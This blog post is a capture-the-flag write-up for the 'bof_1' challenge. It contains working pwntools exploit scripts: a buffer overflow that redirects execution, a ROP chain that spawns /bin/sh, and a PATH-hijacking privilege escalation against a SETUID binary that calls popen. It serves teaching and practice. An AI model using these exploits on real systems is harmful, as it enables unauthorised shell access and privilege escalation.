<!doctype html><html lang=en>
<head>
<title>Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc) :: Nicolas Bourras</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="For this challenge, we were given a service executable. It was also hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ ./service hello who are you? vivescere Hello vivescere We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&amp;rsquo;t have access to the libc easily.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/>
<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
<meta name=twitter:card content="summary">
<meta name=twitter:creator content>
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc)">
<meta property="og:description" content="For this challenge, we were given a service executable. It was also hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ ./service hello who are you? vivescere Hello vivescere We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&amp;rsquo;t have access to the libc easily.">
<meta property="og:url" content="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/">
<meta property="og:site_name" content="Nicolas Bourras">
<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:published_time" content="2021-07-07 19:12:09 +0100 +0100">
</head>
<body class=pink>
<div class="container center">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Nicolas Bourras
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li>
<li><a href=/>Posts</a></li>
<li><a href=/recipes>Recipes</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li>
<li><a href=/>Posts</a></li>
<li><a href=/recipes>Recipes</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/>Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc)</a></h1>
<div class=post-meta>
<span class=post-date>
2021-07-07
</span>
</div>
<span class=post-tags>
#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;
</span>
<div class=post-content><div>
<p>For this challenge, we were given a service executable. It was also hosted remotely.</p>
<p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p>
<h2 id=level-1>Level 1<a href=#level-1 class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec service                                 
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_1/service&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>

$ ./service
hello who are you?
vivescere
Hello vivescere
</code></pre></div><p>We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&rsquo;t have access to the libc easily. Using Ghidra, we can look at the main function:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  
  ignorMe();
  local_38 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  local_30 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  local_28 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  local_20 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  local_18 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  puts(<span style=color:#e6db74>&#34;hello who are you?&#34;</span>);
  __isoc99_scanf(<span style=color:#f92672>&amp;</span>DAT_0049f052,<span style=color:#f92672>&amp;</span>local_38);
  printf(<span style=color:#e6db74>&#34;Hello %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#f92672>&amp;</span>local_38);
  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>Looks like a simple bof. We can directly find out the offset using GDB and <code>cycle</code> from pwntools:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cyclic <span style=color:#ae81ff>100</span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
$ gdb ./service
...
gef➤  r
Starting program: /home/vivescere/ctf/bof_1/service 
hello who are you?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
$rbp   : 0x6161616e6161616d <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;maaanaaa&#34;</span>?<span style=color:#f92672>)</span>
...
<span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────── threads ────
<span style=color:#f92672>[</span><span style=color:#75715e>#0] Id 1, Name: &#34;service&#34;, stopped 0x4019a8 in main (), reason: SIGSEGV</span>
──────────────────────────────────────────────────────────────────────────────────────── trace ────
<span style=color:#f92672>[</span><span style=color:#75715e>#0] 0x4019a8 → main()</span>
───────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  q
$ cyclic -l 0x6161616e
<span style=color:#ae81ff>52</span>
</code></pre></div><p>We have the offset, and could probably use a ropchain to pop a shell. But that&rsquo;s not the goal of this level. Using Ghidra again, we search for the flag format (<code>CYBERTF{...}</code>). An interesting function pops up: <code>magie</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>magie</span>(<span style=color:#66d9ef>int</span> param_1) {
  <span style=color:#66d9ef>int</span> iVar1;
  undefined8 local_15;
  undefined4 local_d;
  undefined local_9;
  
  local_15 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7b46545245425943</span>;
  local_d <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7d595a59</span>;
  local_9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  <span style=color:#66d9ef>if</span> ((param_1 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar1 <span style=color:#f92672>=</span> thunk_FUN_004010e6(<span style=color:#e6db74>&#34;CYBERTF{YZY}&#34;</span>,<span style=color:#f92672>&amp;</span>local_15), iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)) {
    puts(<span style=color:#e6db74>&#34;CYBERTF{_____________________}&#34;</span>);
    <span style=color:#66d9ef>return</span>;
  }
  puts(<span style=color:#e6db74>&#34;Good Way&#34;</span>);
  <span style=color:#66d9ef>return</span>;
}
</code></pre></div><p><code>CYBERTF{_____________________}</code> is replaced by the real flag when connecting to the challenge remotely. A check seems to be in place, but we can simply jump past it.</p>
<p>After whipping out a quick script (using <a href=https://github.com/io12/pwninit>pwninit</a>), we get the flag:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)

context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
    <span style=color:#66d9ef>else</span>:
        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;XXX.XXX.XXX.XXX&#34;</span>, <span style=color:#ae81ff>00000</span>)

    <span style=color:#66d9ef>return</span> r

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    r <span style=color:#f92672>=</span> conn()

    <span style=color:#75715e># Jump into magie, right where the function prints the flag</span>
    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>56</span>
    r<span style=color:#f92672>.</span>sendline(flat({offset: p64(<span style=color:#ae81ff>0x4018da</span>)}))

    print(r<span style=color:#f92672>.</span>recvall()<span style=color:#f92672>.</span>decode(errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span>))
    r<span style=color:#f92672>.</span>close()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python solve_basic.py LOCAL
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_1/service&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_1/service&#39;</span>: pid <span style=color:#ae81ff>650148</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Receiving all data: Done <span style=color:#f92672>(</span>116B<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Process <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_1/service&#39;</span> stopped with exit code -7 <span style=color:#f92672>(</span>SIGBUS<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>pid 650148<span style=color:#f92672>)</span>
hello who are you?
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>18</span>
CYBERTF<span style=color:#f92672>{</span>_____________________<span style=color:#f92672>}</span>
</code></pre></div><p>The flag was <code>CYBERTF{B@sic_Buff3r_Ov3rflow}</code>.</p>
<h2 id=level-2-getshell>Level 2: GetShell<a href=#level-2-getshell class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>Our goal is now to pop a shell. We still have the NX bit on, so we could try using a ropchain. Since the CTF was short, I first tried to automatically generate one using <code>ropper</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ropper --file service --chain <span style=color:#e6db74>&#34;execve cmd=/bin/sh&#34;</span>
...
</code></pre></div><p>The command worked, so I just plugged it into my previous script:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> pack

exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)

context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gen_rop</span>():
    p <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> x : pack(<span style=color:#e6db74>&#39;Q&#39;</span>, x)

    IMAGE_BASE_0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000400000</span> <span style=color:#75715e># aae3c9732e164e7d4d0643ec3d3d8bd1f2a571dcb933e57afd11939c43984473</span>
    rebase_0 <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> x : p(x <span style=color:#f92672>+</span> IMAGE_BASE_0)

    rop <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>

    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x000000000000962f</span>) <span style=color:#75715e># 0x000000000040962f: pop r13; ret; </span>
    rop <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;//bin/sh&#39;</span>
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x0000000000001b2d</span>) <span style=color:#75715e># 0x0000000000401b2d: pop rbx; ret; </span>
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000cc0e0</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000715c2</span>) <span style=color:#75715e># 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span>
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x000000000000962f</span>) <span style=color:#75715e># 0x000000000040962f: pop r13; ret; </span>
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0x0000000000000000</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x0000000000001b2d</span>) <span style=color:#75715e># 0x0000000000401b2d: pop rbx; ret; </span>
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000cc0e8</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000715c2</span>) <span style=color:#75715e># 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span>
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x0000000000001ece</span>) <span style=color:#75715e># 0x0000000000401ece: pop rdi; ret; </span>
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000cc0e0</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x000000000000880e</span>) <span style=color:#75715e># 0x000000000040880e: pop rsi; ret; </span>
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000cc0e8</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x000000000008ef5b</span>) <span style=color:#75715e># 0x000000000048ef5b: pop rdx; pop rbx; ret; </span>
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x00000000000cc0e8</span>)
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0xdeadbeefdeadbeef</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x000000000000302c</span>) <span style=color:#75715e># 0x000000000040302c: pop rax; ret; </span>
    rop <span style=color:#f92672>+=</span> p(<span style=color:#ae81ff>0x000000000000003b</span>)
    rop <span style=color:#f92672>+=</span> rebase_0(<span style=color:#ae81ff>0x000000000001ca64</span>) <span style=color:#75715e># 0x000000000041ca64: syscall; ret; </span>
    <span style=color:#66d9ef>return</span> rop

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
    <span style=color:#66d9ef>else</span>:
        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;XXX.XXX.XXX.XXX&#34;</span>, <span style=color:#ae81ff>00000</span>)

    <span style=color:#66d9ef>return</span> r

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    r <span style=color:#f92672>=</span> conn()

    wanted <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0x401885</span>)
    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>56</span>

    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;?&#39;</span>)
    r<span style=color:#f92672>.</span>recvline()
    r<span style=color:#f92672>.</span>sendline(flat({offset: gen_rop()}))
    r<span style=color:#f92672>.</span>recvline()

    r<span style=color:#f92672>.</span>interactive()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python solve.py LOCAL
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_1/service&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_1/service&#39;</span>: pid <span style=color:#ae81ff>682309</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
$ pwd
/home/vivescere/ctf/bof_1
</code></pre></div><p>And it worked! The flag was in <code>/home/ctf/flag.txt</code>: <code>CYBERTF{B@sic_R0PChain}</code>.</p>
<h2 id=level-3-privesc>Level 3: PrivEsc<a href=#level-3-privesc class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>I started looking around the filesystem, and quickly found a SETUID binary: <code>/bin/check</code>. I didn&rsquo;t have a way to download it using SCP, so I patched the exploit to do it instead:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    r <span style=color:#f92672>=</span> conn()

    wanted <span style=color:#f92672>=</span> p64(<span style=color:#ae81ff>0x401885</span>)
    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>56</span>

    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;?&#39;</span>)
    r<span style=color:#f92672>.</span>recvline()
    r<span style=color:#f92672>.</span>sendline(flat({offset: gen_rop()}))
    r<span style=color:#f92672>.</span>recvline()

    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;check&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> f:
        r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;cat /bin/check&#39;</span>)
        r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;exit&#39;</span>)
        f<span style=color:#f92672>.</span>write(r<span style=color:#f92672>.</span>recvall())
</code></pre></div><p>I then decompiled the main function using Ghidra:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
  <span style=color:#66d9ef>int</span> iVar1;
  undefined8 uVar2;
  size_t sVar3;
  <span style=color:#66d9ef>long</span> lVar4;
  undefined8 <span style=color:#f92672>*</span>puVar5;
  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
  byte bVar6;
  undefined8 local_420;
  undefined8 local_418;
  undefined8 local_410;
  undefined8 local_408 [<span style=color:#ae81ff>127</span>];
  <span style=color:#66d9ef>long</span> local_10;
  
  bVar6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  local_10 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
  setreuid(<span style=color:#ae81ff>0x3e9</span>,<span style=color:#ae81ff>0x3e9</span>);
  local_418 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  local_410 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  lVar4 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e</span>;
  puVar5 <span style=color:#f92672>=</span> local_408;
  <span style=color:#66d9ef>while</span> (lVar4 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
    lVar4 <span style=color:#f92672>=</span> lVar4 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
    <span style=color:#f92672>*</span>puVar5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    puVar5 <span style=color:#f92672>=</span> puVar5 <span style=color:#f92672>+</span> (ulong)bVar6 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
  }
  local_420 <span style=color:#f92672>=</span> popen(<span style=color:#e6db74>&#34;md5sum /home/ctf_cracked/flag.txt | cut -d </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74> -f 1&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
  <span style=color:#66d9ef>if</span> (local_420 <span style=color:#f92672>==</span> (FILE <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>) {
    puts(<span style=color:#e6db74>&#34;Command Failed&#34;</span>);
    uVar2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
  }
  <span style=color:#66d9ef>else</span> {
    fgets((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418,<span style=color:#ae81ff>0x400</span>,local_420);
    sVar3 <span style=color:#f92672>=</span> strlen((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418);
    <span style=color:#f92672>*</span>(undefined <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>local_420 <span style=color:#f92672>+</span> sVar3 <span style=color:#f92672>+</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    iVar1 <span style=color:#f92672>=</span> strcmp((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418,<span style=color:#e6db74>&#34;8b098e9d5692641375f8da6d399edf98&#34;</span>);
    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      puts(<span style=color:#e6db74>&#34;All is clear&#34;</span>);
    }
    <span style=color:#66d9ef>else</span> {
      puts(<span style=color:#e6db74>&#34;Contact Administrator&#34;</span>);
    }
    uVar2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  }
  <span style=color:#66d9ef>if</span> (local_10 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
    __stack_chk_fail();
  }
  <span style=color:#66d9ef>return</span> uVar2;
}
</code></pre></div><p>The file containing the flag is (of course) not directly readable, but the owner is the same as the binary owner: <code>ctf_cracked</code>. The program executes a command. We can abuse this by editing the PATH before launching the binary:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cd /tmp
$ mkdir solution
$ echo <span style=color:#e6db74>&#39;#!/bin/bash&#39;</span> &gt;&gt; md5sum
$ echo <span style=color:#e6db74>&#39;cat /home/ctf_cracked/flag.txt &gt; /tmp/solution/flag.txt&#39;</span> &gt;&gt; md5sum
$ PATH<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>:/bin check
$ cat /tmp/solution/flag.txt
</code></pre></div><p>The flag was <code>CYBERTF{B@sicPrivEsc(Anti_Gu3ssing)}</code>.</p>
<h2 id=more>More<a href=#more class=hanchor arialabel=Anchor>&#8983;</a> </h2>
<p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof1>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p>
</div></div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/>
<span class=button__icon>←</span>
<span class=button__text>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</span>
</a>
</span>
<span class="button next">
<a href=https://nicolasb.fr/blog/dghack-my-second-ctf/>
<span class=button__text>DG'hAck: My Second CTF</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class=copyright>
<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
</div>
</div>
</footer>
<script src=https://nicolasb.fr/assets/main.js></script>
<script src=https://nicolasb.fr/assets/prism.js></script>
</div>
</body>
</html>